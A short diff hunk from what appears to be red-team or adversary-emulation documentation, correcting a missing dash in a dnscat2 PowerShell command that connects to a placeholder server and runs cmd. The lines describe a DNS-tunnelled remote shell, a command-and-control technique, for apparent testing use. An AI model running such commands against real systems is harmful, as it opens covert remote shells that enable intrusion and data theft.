@@ -149,7 +149,7 @@ Example: ruby dnscat2.rb --dns="domain=example.com" --no cache
 ##### dnscat2 PowerShell Client
 
 ```sh
-Start-Dnscat2 -Domain #{dnscat2 server} Exec cmd
+Start-Dnscat2 -Domain #{dnscat2 server} -Exec cmd
 ```
 
 ---
